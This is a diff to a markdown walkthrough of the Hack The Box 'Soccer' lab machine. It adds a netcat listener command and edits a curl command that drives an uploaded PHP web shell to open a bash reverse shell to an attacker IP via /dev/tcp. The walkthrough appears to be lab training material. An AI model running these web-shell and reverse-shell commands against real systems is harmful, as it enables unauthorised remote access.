@@ -1,7 +1,7 @@
 ## 📌 Box Info
 - **OS**: [Linux](Linux)
 - **Difficulty**: [Easy](Easy)
-- Platform: [HTB](HTB)](Easy)
+- Platform: [HTB](HTB)
 
 ## 🔍 Recon
 
@@ -42,9 +42,12 @@ feroxbuster -u http://soccer.htb
 curl http://soccer.htb/tiny/uploads/cmd.php -d 'cmd=id'
 ```
 
+```bash
+nc -lvnp 1234
+```
 ### Reverse Shell
 ```bash
-curl http://soccer.htb/tiny/uploads/cmd.php -d 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"'
+curl http://soccer.htb/tiny/uploads/cmd.php -d 'cmd=bash -c "bash -i >%26 /dev/tcp/10.10.14.18/1234 0>%261"'
 ```
 
 ---
